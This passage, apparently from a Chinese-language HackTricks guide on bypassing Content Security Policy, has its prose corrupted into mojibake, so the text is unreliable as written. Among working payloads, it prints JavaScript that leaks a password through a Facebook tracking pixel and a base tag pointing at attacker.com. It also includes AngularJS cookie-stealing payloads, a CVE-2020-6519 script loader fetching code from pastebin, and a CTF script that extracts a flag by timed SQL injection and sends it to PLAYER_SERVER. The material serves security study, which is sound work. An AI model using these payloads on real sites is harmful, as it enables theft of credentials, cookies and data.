ç„¶åï¼Œåœ¨å—å®³è€…ç«¯ï¼Œæ‚¨æ‰§è¡Œä»¥ä¸‹ä»£ç æ¥åˆå§‹åŒ–Facebookè·Ÿè¸ªåƒç´ ï¼ŒæŒ‡å‘æ”»å‡»è€…çš„Facebookå¼€å‘è€…å¸æˆ·åº”ç”¨ç¨‹åºIDï¼Œå¹¶å‘å‡ºç±»ä¼¼ä»¥ä¸‹çš„è‡ªå®šä¹‰äº‹ä»¶ï¼š
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
### é€šè¿‡RPOï¼ˆç›¸å¯¹è·¯å¾„è¦†ç›–ï¼‰ç»•è¿‡ <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

é™¤äº†å‰é¢æåˆ°çš„é‡å®šå‘ç»•è¿‡è·¯å¾„é™åˆ¶ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§ç§°ä¸ºç›¸å¯¹è·¯å¾„è¦†ç›–ï¼ˆRPOï¼‰çš„æŠ€æœ¯å¯ç”¨äºæŸäº›æœåŠ¡å™¨ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœCSPå…è®¸è·¯å¾„`https://example.com/scripts/react/`ï¼Œåˆ™å¯ä»¥å¦‚ä¸‹ç»•è¿‡ï¼š
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
æµè§ˆå™¨æœ€ç»ˆå°†åŠ è½½`https://example.com/scripts/angular/angular.js`ã€‚

è¿™æ˜¯å› ä¸ºå¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ‚¨æ­£åœ¨åŠ è½½ä½äº`https://example.com/scripts/react/`ä¸‹åä¸º`..%2fangular%2fangular.js`çš„æ–‡ä»¶ï¼Œè¿™ä¸CSPå…¼å®¹ã€‚

å› æ­¤ï¼Œå®ƒä»¬å°†å¯¹å…¶è¿›è¡Œè§£ç ï¼Œæœ‰æ•ˆåœ°è¯·æ±‚`https://example.com/scripts/react/../angular/angular.js`ï¼Œè¿™ç­‰åŒäº`https://example.com/scripts/angular/angular.js`ã€‚

é€šè¿‡**åˆ©ç”¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´URLè§£é‡Šçš„ä¸ä¸€è‡´æ€§ï¼Œå¯ä»¥ç»•è¿‡è·¯å¾„è§„åˆ™**ã€‚

è§£å†³æ–¹æ¡ˆæ˜¯åœ¨æœåŠ¡å™¨ç«¯ä¸å°†`%2f`è§†ä¸º`/`ï¼Œç¡®ä¿æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¸€è‡´è§£é‡Šä»¥é¿å…æ­¤é—®é¢˜ã€‚

åœ¨çº¿ç¤ºä¾‹ï¼š[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JSæ‰§è¡Œ

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### ç¼ºå°‘**base-uri**

å¦‚æœç¼ºå°‘**base-uri**æŒ‡ä»¤ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨å®ƒæ‰§è¡Œ[**æ‚¬æŒ‚æ ‡è®°æ³¨å…¥**](../dangling-markup-html-scriptless-injection/)ã€‚

æ­¤å¤–ï¼Œå¦‚æœ**é¡µé¢æ­£åœ¨ä½¿ç”¨ç›¸å¯¹è·¯å¾„åŠ è½½è„šæœ¬**ï¼ˆå¦‚`<script src="/js/app.js">`ï¼‰å¹¶ä½¿ç”¨**Nonce**ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨**åŸºæœ¬** **æ ‡ç­¾**ä½¿å…¶ä»**æ‚¨è‡ªå·±çš„æœåŠ¡å™¨åŠ è½½**è„šæœ¬ä»¥å®ç°XSSã€‚\
å¦‚æœæ˜“å—æ”»å‡»çš„é¡µé¢ä½¿ç”¨**httpS**åŠ è½½ï¼Œè¯·åœ¨åŸºæœ¬æ ‡ç­¾ä¸­ä½¿ç”¨httpSç½‘å€ã€‚
```html
<base href="https://www.attacker.com/">
```
### AngularJS äº‹ä»¶

ä¸€ç§åä¸ºå†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰çš„ç‰¹å®šç­–ç•¥å¯èƒ½ä¼šé™åˆ¶JavaScriptäº‹ä»¶ã€‚ç„¶è€Œï¼ŒAngularJSå¼•å…¥äº†è‡ªå®šä¹‰äº‹ä»¶ä½œä¸ºä¸€ç§æ›¿ä»£æ–¹æ¡ˆã€‚åœ¨äº‹ä»¶ä¸­ï¼ŒAngularJSæä¾›äº†ä¸€ä¸ªåä¸º`$event`çš„ç‹¬ç‰¹å¯¹è±¡ï¼Œå¼•ç”¨äº†åŸç”Ÿæµè§ˆå™¨äº‹ä»¶å¯¹è±¡ã€‚è¿™ä¸ª`$event`å¯¹è±¡å¯ä»¥è¢«åˆ©ç”¨æ¥ç»•è¿‡CSPã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨Chromeä¸­ï¼Œ`$event/event`å¯¹è±¡å…·æœ‰ä¸€ä¸ª`path`å±æ€§ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå¯¹è±¡æ•°ç»„ï¼Œæ¶‰åŠäº‹ä»¶æ‰§è¡Œé“¾ï¼Œ`window`å¯¹è±¡å§‹ç»ˆä½äºæœ€åã€‚è¿™ç§ç»“æ„å¯¹äºæ²™ç®±é€ƒé€¸ç­–ç•¥è‡³å…³é‡è¦ã€‚

é€šè¿‡å°†è¿™ä¸ªæ•°ç»„æŒ‡å‘`orderBy`è¿‡æ»¤å™¨ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œè¿­ä»£ï¼Œåˆ©ç”¨ç»ˆç«¯å…ƒç´ ï¼ˆ`window`å¯¹è±¡ï¼‰æ¥è§¦å‘ç±»ä¼¼`alert()`çš„å…¨å±€å‡½æ•°ã€‚ä¸‹é¢æ¼”ç¤ºçš„ä»£ç ç‰‡æ®µé˜æ˜äº†è¿™ä¸ªè¿‡ç¨‹ï¼š
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
è¿™æ®µä»£ç ç‰‡æ®µçªå‡ºäº†ä½¿ç”¨`ng-focus`æŒ‡ä»¤æ¥è§¦å‘äº‹ä»¶ï¼Œåˆ©ç”¨`$event.path|orderBy`æ¥æ“ä½œ`path`æ•°ç»„ï¼Œå¹¶åˆ©ç”¨`window`å¯¹è±¡æ‰§è¡Œ`alert()`å‡½æ•°ï¼Œä»è€Œæ­ç¤º`document.cookie`ã€‚

**åœ¨** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **ä¸­æŸ¥æ‰¾å…¶ä»–Angularç»•è¿‡æ–¹æ³•**

### AngularJSå’Œç™½åå•åŸŸ
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
## CSP Bypass through Callback Functions and Vulnerable Classes

åœ¨ Angular JS åº”ç”¨ç¨‹åºä¸­ï¼Œé€šè¿‡è°ƒç”¨å›è°ƒå‡½æ•°å’ŒæŸäº›æ˜“å—æ”»å‡»çš„ç±»ï¼Œå¯ä»¥ç»•è¿‡ç™½åå•è„šæœ¬åŠ è½½çš„ CSP ç­–ç•¥ã€‚æœ‰å…³æ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[æ­¤å¤„](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22)æä¾›çš„è¯¦ç»†æŒ‡å—ã€‚ 

æœ‰æ•ˆè½½è·ï¼š
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
å…¶ä»–JSONPä»»æ„æ‰§è¡Œç«¯ç‚¹å¯ä»¥åœ¨[**è¿™é‡Œ**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)æ‰¾åˆ°ï¼ˆå…¶ä¸­ä¸€äº›å·²è¢«åˆ é™¤æˆ–ä¿®å¤ï¼‰

### é€šè¿‡é‡å®šå‘ç»•è¿‡

å½“CSPé‡åˆ°æœåŠ¡å™¨ç«¯é‡å®šå‘æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿå¦‚æœé‡å®šå‘å¯¼è‡´åˆ°ä¸€ä¸ªä¸å…è®¸çš„ä¸åŒæºï¼Œå®ƒä»ç„¶ä¼šå¤±è´¥ã€‚

ç„¶è€Œï¼Œæ ¹æ®[CSPè§„èŒƒ4.2.2.3. è·¯å¾„å’Œé‡å®šå‘](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects)ä¸­çš„æè¿°ï¼Œå¦‚æœé‡å®šå‘å¯¼è‡´åˆ°ä¸åŒè·¯å¾„ï¼Œå®ƒå¯ä»¥ç»•è¿‡åŸå§‹é™åˆ¶ã€‚

è¿™é‡Œæœ‰ä¸€ä¸ªä¾‹å­ï¼š
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
å¦‚æœCSPè®¾ç½®ä¸º`https://www.google.com/a/b/c/d`ï¼Œç”±äºè·¯å¾„è¢«è€ƒè™‘åœ¨å†…ï¼Œ`/test`å’Œ`/a/test`è„šæœ¬éƒ½å°†è¢«CSPé˜»æ­¢ã€‚

ç„¶è€Œï¼Œæœ€ç»ˆçš„`http://localhost:5555/301`å°†åœ¨æœåŠ¡å™¨ç«¯**é‡å®šå‘åˆ°`https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œ**è·¯å¾„ä¸è¢«è€ƒè™‘**ï¼Œå› æ­¤**è„šæœ¬å¯ä»¥è¢«åŠ è½½**ï¼Œä»è€Œç»•è¿‡è·¯å¾„é™åˆ¶ã€‚

é€šè¿‡è¿™ç§é‡å®šå‘ï¼Œå³ä½¿å®Œå…¨æŒ‡å®šäº†è·¯å¾„ï¼Œä»å°†è¢«ç»•è¿‡ã€‚

å› æ­¤ï¼Œæœ€ä½³è§£å†³æ–¹æ¡ˆæ˜¯ç¡®ä¿ç½‘ç«™æ²¡æœ‰ä»»ä½•å¼€æ”¾çš„é‡å®šå‘æ¼æ´ï¼Œå¹¶ä¸”åœ¨CSPè§„åˆ™ä¸­æ²¡æœ‰å¯ä»¥è¢«åˆ©ç”¨çš„åŸŸã€‚

### ä½¿ç”¨æ‚¬æŒ‚æ ‡è®°ç»•è¿‡CSP

é˜…è¯»[æ­¤å¤„çš„æ–¹æ³•](../dangling-markup-html-scriptless-injection/)ã€‚

### 'unsafe-inline'; img-src \*; é€šè¿‡XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` æ„å‘³ç€æ‚¨å¯ä»¥åœ¨ä»£ç ä¸­æ‰§è¡Œä»»ä½•è„šæœ¬ï¼ˆXSS å¯ä»¥æ‰§è¡Œä»£ç ï¼‰ï¼Œ`img-src *` æ„å‘³ç€æ‚¨å¯ä»¥åœ¨ç½‘é¡µä¸­ä½¿ç”¨æ¥è‡ªä»»ä½•èµ„æºçš„ä»»ä½•å›¾åƒã€‚

æ‚¨å¯ä»¥é€šè¿‡å›¾åƒæ¥ç»•è¿‡æ­¤ CSPï¼Œé€šè¿‡å›¾åƒå°†æ•°æ®å¤–æ³„ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒXSS æ»¥ç”¨ CSRFï¼Œåœ¨ä¸€ä¸ªæœºå™¨äººå¯è®¿é—®çš„é¡µé¢ä¸­åŒ…å«ä¸€ä¸ª SQLiï¼Œå¹¶é€šè¿‡å›¾åƒæå–æ ‡å¿—ï¼‰ï¼š
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

æ‚¨è¿˜å¯ä»¥æ»¥ç”¨æ­¤é…ç½®æ¥**åŠ è½½æ’å…¥å›¾åƒä¸­çš„JavaScriptä»£ç **ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé¡µé¢å…è®¸ä»TwitteråŠ è½½å›¾åƒã€‚æ‚¨å¯ä»¥**åˆ¶ä½œ**ä¸€ä¸ª**ç‰¹æ®Šå›¾åƒ**ï¼Œå°†å…¶**ä¸Šä¼ **åˆ°Twitterï¼Œå¹¶æ»¥ç”¨â€œ**unsafe-inline**â€æ¥**æ‰§è¡Œ**ä¸€ä¸ªJSä»£ç ï¼ˆä½œä¸ºå¸¸è§„XSSï¼‰ï¼Œè¯¥ä»£ç å°†**åŠ è½½**å›¾åƒï¼Œ**æå–**å…¶ä¸­çš„**JS**å¹¶**æ‰§è¡Œ**å®ƒï¼š[https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### ä½¿ç”¨Service Workers

Service workersçš„**`importScripts`**å‡½æ•°ä¸å—CSPé™åˆ¶ï¼š

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### ç­–ç•¥æ³¨å…¥

**ç ”ç©¶ï¼š** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

å¦‚æœæ‚¨å‘é€çš„**å‚æ•°**è¢«**ç²˜è´´åˆ°**ç­–ç•¥çš„**å£°æ˜**ä¸­ï¼Œåˆ™å¯ä»¥ä»¥æŸç§æ–¹å¼**æ›´æ”¹**ç­–ç•¥ï¼Œä½¿å…¶**æ— æ•ˆ**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»»ä½•ç»•è¿‡æ–¹å¼ä¹‹ä¸€å…è®¸è„šæœ¬â€œunsafe-inlineâ€ï¼š
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
å› ä¸ºè¿™ä¸ªæŒ‡ä»¤ä¼š**è¦†ç›–ç°æœ‰çš„ script-src æŒ‡ä»¤**ã€‚\
ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªä¾‹å­ï¼š[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

åœ¨ Edge ä¸­æ›´ç®€å•ã€‚å¦‚æœä½ å¯ä»¥åœ¨ CSP ä¸­æ·»åŠ è¿™ä¸ªï¼š**`;_`**ï¼Œ**Edge** å°†**ä¸¢å¼ƒ**æ•´ä¸ª**ç­–ç•¥**ã€‚\
ä¾‹å­ï¼š[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; é€šè¿‡ XSSï¼ˆiframeï¼‰è¿›è¡Œæ”»å‡» - æ—¶é—´æ”»å‡»

æ³¨æ„ç¼ºå°‘æŒ‡ä»¤`'unsafe-inline'`\
è¿™æ¬¡ä½ å¯ä»¥è®©å—å®³è€…é€šè¿‡**XSS**åŠ è½½ä¸€ä¸ªåœ¨**ä½ æ§åˆ¶ä¸‹**çš„é¡µé¢ï¼Œä½¿ç”¨ `<iframe`ã€‚è¿™æ¬¡ä½ å°†è®©å—å®³è€…è®¿é—®ä½ æƒ³è¦æå–ä¿¡æ¯ï¼ˆ**CSRF**ï¼‰çš„é¡µé¢ã€‚ä½ æ— æ³•è®¿é—®é¡µé¢çš„å†…å®¹ï¼Œä½†å¦‚æœä½ å¯ä»¥**æ§åˆ¶é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´**ï¼Œä½ å°±å¯ä»¥æå–æ‰€éœ€çš„ä¿¡æ¯ã€‚

è¿™æ¬¡å°†æå–ä¸€ä¸ª**æ ‡å¿—**ï¼Œæ¯å½“é€šè¿‡ SQLi **æ­£ç¡®çŒœæµ‹ä¸€ä¸ªå­—ç¬¦**æ—¶ï¼Œç”±äº sleep å‡½æ•°ï¼Œ**å“åº”**ä¼š**èŠ±è´¹æ›´å¤šæ—¶é—´**ã€‚ç„¶åï¼Œä½ å°†èƒ½å¤Ÿæå–æ ‡å¿—ï¼š
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### é€šè¿‡ä¹¦ç­¾å·¥å…·

è¿™ç§æ”»å‡»éœ€è¦ä¸€äº›ç¤¾ä¼šå·¥ç¨‹ï¼Œæ”»å‡»è€…**è¯´æœç”¨æˆ·å°†é“¾æ¥æ‹–æ”¾åˆ°æµè§ˆå™¨çš„ä¹¦ç­¾å·¥å…·ä¸Š**ã€‚è¿™ä¸ªä¹¦ç­¾å·¥å…·ä¼šåŒ…å«**æ¶æ„çš„ JavaScript** ä»£ç ï¼Œå½“æ‹–æ”¾æˆ–ç‚¹å‡»æ—¶ä¼šåœ¨å½“å‰ç½‘é¡µçª—å£çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œ**ç»•è¿‡ CSP å¹¶å…è®¸çªƒå–æ•æ„Ÿä¿¡æ¯**ï¼Œæ¯”å¦‚ cookies æˆ–ä»¤ç‰Œã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯[**è¯·æŸ¥çœ‹åŸå§‹æŠ¥å‘Š**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)ã€‚

### é€šè¿‡é™åˆ¶ CSP æ¥ç»•è¿‡ CSP

åœ¨[**è¿™ä¸ª CTF è§£å¯†**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution)ä¸­ï¼Œé€šè¿‡åœ¨å…è®¸çš„ iframe ä¸­æ³¨å…¥ä¸€ä¸ªæ›´ä¸¥æ ¼çš„ CSP æ¥ç»•è¿‡ CSPï¼Œè¯¥ CSP ç¦æ­¢åŠ è½½ç‰¹å®šçš„ JS æ–‡ä»¶ï¼Œç„¶åé€šè¿‡**åŸå‹æ±¡æŸ“**æˆ–**DOM ç¯¡æ”¹**å…è®¸**æ»¥ç”¨ä¸åŒçš„è„šæœ¬æ¥åŠ è½½ä»»æ„è„šæœ¬**ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨**`csp`**å±æ€§**é™åˆ¶ iframe çš„ CSP**ï¼š

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

åœ¨[**è¿™ä¸ªCTFè§£å¯†**](https://github.com/aszx87410/ctf-writeups/issues/48)ä¸­ï¼Œé€šè¿‡**HTMLæ³¨å…¥**å¯ä»¥æ›´åŠ **é™åˆ¶**ä¸€ä¸ª**CSP**ï¼Œä»è€Œç¦ç”¨äº†é˜²æ­¢CSTIçš„è„šæœ¬ï¼Œå› æ­¤**æ¼æ´å˜å¾—å¯åˆ©ç”¨ã€‚**\
å¯ä»¥ä½¿ç”¨**HTML metaæ ‡ç­¾**ä½¿CSPæ›´åŠ ä¸¥æ ¼ï¼Œå†…è”è„šæœ¬å¯ä»¥è¢«ç¦ç”¨ï¼Œ**ç§»é™¤**å…è®¸å®ƒä»¬çš„**å…¥å£**ï¼Œå¹¶é€šè¿‡**shaå¯ç”¨ç‰¹å®šçš„å†…è”è„šæœ¬**ï¼š
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### ä½¿ç”¨ Content-Security-Policy-Report-Only è¿›è¡Œ JS æ•°æ®æ³„éœ²

å¦‚æœä½ èƒ½å¤Ÿè®©æœåŠ¡å™¨å“åº”å¤´éƒ¨ **`Content-Security-Policy-Report-Only`** çš„å€¼**ç”±ä½ æ§åˆ¶**ï¼ˆå¯èƒ½æ˜¯å› ä¸º CRLFï¼‰ï¼Œä½ å¯ä»¥è®©å®ƒæŒ‡å‘ä½ çš„æœåŠ¡å™¨ï¼Œå¦‚æœä½ **ç”¨** **`<script>`** **åŒ…è£¹**ä½ æƒ³è¦æ³„éœ²çš„**JSå†…å®¹**ï¼Œå¹¶ä¸”å› ä¸ºé«˜åº¦å¯èƒ½ `unsafe-inline` ä¸è¢« CSP å…è®¸ï¼Œè¿™å°†**è§¦å‘ CSP é”™è¯¯**ï¼Œå¹¶ä¸”åŒ…å«æ•æ„Ÿä¿¡æ¯çš„è„šæœ¬çš„ä¸€éƒ¨åˆ†å°†ä» `Content-Security-Policy-Report-Only` å‘é€åˆ°æœåŠ¡å™¨ã€‚

ä¾‹å¦‚ï¼Œ[**æŸ¥çœ‹è¿™ä¸ª CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)ã€‚

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### ä½¿ç”¨CSPå’ŒIframeæ³„éœ²ä¿¡æ¯

- åˆ›å»ºä¸€ä¸ªæŒ‡å‘URLï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º`https://example.redirect.com`ï¼‰çš„`iframe`ï¼Œè¯¥URLåœ¨CSPä¸­è¢«å…è®¸ã€‚
- ç„¶åï¼Œè¯¥URLé‡å®šå‘åˆ°ä¸€ä¸ªæœªè¢«CSPå…è®¸çš„ç§˜å¯†URLï¼ˆä¾‹å¦‚`https://usersecret.example2.com`ï¼‰ã€‚
- é€šè¿‡ç›‘å¬`securitypolicyviolation`äº‹ä»¶ï¼Œå¯ä»¥æ•è·`blockedURI`å±æ€§ã€‚è¯¥å±æ€§ä¼šæ˜¾ç¤ºè¢«é˜»æ­¢çš„URIçš„åŸŸï¼Œä»è€Œæ³„éœ²åˆå§‹URLé‡å®šå‘åˆ°çš„ç§˜å¯†åŸŸã€‚

æœ‰è¶£çš„æ˜¯ï¼ŒåƒChromeå’ŒFirefoxè¿™æ ·çš„æµè§ˆå™¨åœ¨å¤„ç†ä¸CSPç›¸å…³çš„iframesæ—¶æœ‰ä¸åŒçš„è¡Œä¸ºï¼Œå¯èƒ½å¯¼è‡´ç”±äºæœªå®šä¹‰çš„è¡Œä¸ºè€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

å¦ä¸€ç§æŠ€æœ¯æ¶‰åŠåˆ©ç”¨CSPæœ¬èº«æ¥æ¨æ–­ç§˜å¯†å­åŸŸã€‚è¿™ç§æ–¹æ³•ä¾èµ–äºäºŒåˆ†æœç´¢ç®—æ³•ï¼Œå¹¶è°ƒæ•´CSPä»¥åŒ…å«ç‰¹å®šè¢«æ•…æ„é˜»æ­¢çš„åŸŸã€‚ä¾‹å¦‚ï¼Œå¦‚æœç§˜å¯†å­åŸŸç”±æœªçŸ¥å­—ç¬¦ç»„æˆï¼Œæ‚¨å¯ä»¥é€šè¿‡ä¿®æ”¹CSPæŒ‡ä»¤æ¥é˜»æ­¢æˆ–å…è®¸è¿™äº›å­åŸŸï¼Œè¿­ä»£åœ°æµ‹è¯•ä¸åŒçš„å­åŸŸã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ˜¾ç¤ºå¦‚ä½•è®¾ç½®CSPä»¥ä¾¿å®ç°æ­¤æ–¹æ³•çš„ä»£ç ç‰‡æ®µï¼š
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
é€šè¿‡ç›‘è§† CSP é˜»æ­¢æˆ–å…è®¸çš„è¯·æ±‚ï¼Œå¯ä»¥ç¼©å°ç§˜å¯†å­åŸŸä¸­å¯èƒ½çš„å­—ç¬¦èŒƒå›´ï¼Œæœ€ç»ˆæ­ç¤ºå®Œæ•´çš„ URLã€‚

è¿™ä¸¤ç§æ–¹æ³•åˆ©ç”¨äº†æµè§ˆå™¨ä¸­ CSP å®ç°å’Œè¡Œä¸ºçš„å¾®å¦™ä¹‹å¤„ï¼Œå±•ç¤ºäº†çœ‹ä¼¼å®‰å…¨çš„ç­–ç•¥å¦‚ä½•æ— æ„ä¸­æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

æ¥è‡ª [**è¿™é‡Œ**](https://ctftime.org/writeup/29310) çš„æŠ€å·§ã€‚

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œèµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£åŠæ—¶äº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
éšæ—¶äº†è§£æœ€æ–°çš„èµé‡‘ä»»åŠ¡å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œç«‹å³ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

## ç»•è¿‡ CSP çš„ä¸å®‰å…¨æŠ€æœ¯

### PHP å“åº”ç¼“å†²åŒºè¶…è½½

PHP é»˜è®¤ä¼šå°†å“åº”ç¼“å†²åˆ° 4096 å­—èŠ‚ã€‚å› æ­¤ï¼Œå¦‚æœ PHP æ˜¾ç¤ºè­¦å‘Šï¼Œé€šè¿‡åœ¨è­¦å‘Šä¸­æä¾›è¶³å¤Ÿçš„æ•°æ®ï¼Œå“åº”å°†åœ¨ CSP å¤´ä¹‹å‰å‘é€ï¼Œå¯¼è‡´å¤´éƒ¨è¢«å¿½ç•¥ã€‚\
ç„¶åï¼Œè¯¥æŠ€æœ¯åŸºæœ¬ä¸Šæ˜¯é€šè¿‡åœ¨å“åº”ç¼“å†²åŒºä¸­å¡«å……è­¦å‘Šï¼Œä»¥ä¾¿ä¸å‘é€ CSP å¤´ã€‚

